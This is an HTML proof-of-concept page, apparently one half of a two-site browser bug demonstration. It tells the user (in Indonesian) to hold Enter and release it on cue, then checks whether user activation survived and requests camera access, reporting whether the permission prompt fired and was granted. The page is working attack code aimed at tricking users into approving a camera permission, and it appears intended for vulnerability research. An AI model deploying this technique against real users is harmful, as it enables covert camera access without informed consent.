<!DOCTYPE html>
<html>

<head>
    <title>PoC - Site B (Camera Prompt)</title>
    <style>
        body {
            font-family: monospace;
            background: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        #timer {
            font-size: 3rem;
            font-weight: bold;
        }

        #status {
            margin-top: 20px;
            color: #666;
            text-align: center;
        }
    </style>
</head>

<body>

    <div id="timer">2s...</div>
    <div id="status">Tahan "Enter" sampai 1s</div>

    <script>
        setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
        setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);

        window.addEventListener('keyup', async (e) => {
            if (e.key === 'Enter') {
                const status = document.getElementById('status');

                if (navigator.userActivation.isActive) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        stream.getTracks().forEach(track => track.stop());

                        status.innerHTML = "<b style='color:black;'>✅ SUCCESS: Camera Prompt Triggered & Permission Granted!</b>";
                    } catch (err) {
                        status.innerHTML = `<b style='color:red;'>RESULT: ${err.name}</b><br>${err.message}`;
                        console.log("Trigger failed:", err);
                    }
                } else {
                    status.innerText = "RESULT: EXPIRED (User Activation was not preserved)";
                }
            }
        });
    </script>
</body>

</html>
